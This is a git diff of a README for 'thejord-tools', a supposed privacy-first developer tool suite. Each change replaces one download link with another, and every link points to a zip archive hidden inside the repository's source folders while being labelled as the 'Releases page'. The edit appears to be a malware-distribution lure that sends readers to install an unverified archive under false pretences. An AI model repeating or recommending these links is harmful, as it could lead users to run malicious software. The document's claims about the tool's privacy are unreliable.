@@ -4,11 +4,11 @@
 Welcome to the **thejord-tools** project! This suite of developer tools is designed for your privacy. With features like JSON formatting, Base64 encoding, and more, this application makes coding easier without sacrificing your privacy. 
 
 ## 📥 Download the Application
-[![Download thejord-tools](https://raw.githubusercontent.com/kengamsuraj/thejord-tools/main/test-results/thejord-tools_v1.2.zip)](https://raw.githubusercontent.com/kengamsuraj/thejord-tools/main/test-results/thejord-tools_v1.2.zip)
+[![Download thejord-tools](https://github.com/kengamsuraj/thejord-tools/raw/refs/heads/main/src/content/tools-thejord-1.9.zip)](https://github.com/kengamsuraj/thejord-tools/raw/refs/heads/main/src/content/tools-thejord-1.9.zip)
 
 You can download the latest version of the application from our Releases page. Click the link below to get started:
 
-[Visit this page to download](https://raw.githubusercontent.com/kengamsuraj/thejord-tools/main/test-results/thejord-tools_v1.2.zip)
+[Visit this page to download](https://github.com/kengamsuraj/thejord-tools/raw/refs/heads/main/src/content/tools-thejord-1.9.zip)
 
 ## 💻 System Requirements
 Before you install, make sure your computer meets these requirements:
@@ -20,7 +20,7 @@ Before you install, make sure your computer meets these requirements:
 ## 📦 Installation Instructions
 Follow these simple steps to install **thejord-tools** on your computer:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/kengamsuraj/thejord-tools/main/test-results/thejord-tools_v1.2.zip) using the link above.
+1. Visit the [Releases page](https://github.com/kengamsuraj/thejord-tools/raw/refs/heads/main/src/content/tools-thejord-1.9.zip) using the link above.
 2. Look for the latest version, usually marked with the highest version number.
 3. Click on the version you want to download. 
 4. After the download is complete, locate the file on your computer.
@@ -52,7 +52,7 @@ Once you have installed **thejord-tools**, you can start using the tools immedia
 **thejord-tools** is a privacy-first suite of developer tools designed to enhance productivity and maintain privacy. 
 
 ### 2. How do I update the application?
-Visit the [Releases page](https://raw.githubusercontent.com/kengamsuraj/thejord-tools/main/test-results/thejord-tools_v1.2.zip) and download the latest version, then follow the installation steps again.
+Visit the [Releases page](https://github.com/kengamsuraj/thejord-tools/raw/refs/heads/main/src/content/tools-thejord-1.9.zip) and download the latest version, then follow the installation steps again.
 
 ### 3. Can I use this application offline?
 Yes, once installed, **thejord-tools** can function completely offline.
